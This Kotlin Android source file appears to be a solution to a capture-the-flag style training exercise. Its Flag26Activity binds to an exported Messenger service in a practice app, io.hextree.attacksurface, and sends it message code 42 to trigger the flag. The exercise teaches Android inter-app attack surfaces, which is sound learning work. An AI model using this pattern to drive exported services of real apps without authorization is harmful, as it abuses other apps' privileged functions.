package com.pachinko.intentattacksurface

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.os.Message
import android.os.Messenger
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.pachinko.intentattacksurface.ui.theme.IntentAttackSurfaceTheme

class Flag26Activity : ComponentActivity() {
    var mService: Messenger? = null
    var isBound = false

    private val mConnection = object: ServiceConnection {
        override fun onServiceConnected(className: ComponentName, service: IBinder) {
            mService = Messenger(service)
            isBound = true
            Log.d("Flag26Activity", "Service Connected")
            val mMessage = Message.obtain(null, 42)
            mService?.send(mMessage)
        }

        override fun onServiceDisconnected(classname: ComponentName) {
            mService = null
            isBound = false
            Log.d("Flag26Activity", "Service Disconnected")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag26Service"
            )
        }
        bindService(intent, mConnection, Context.BIND_AUTO_CREATE)
    }
}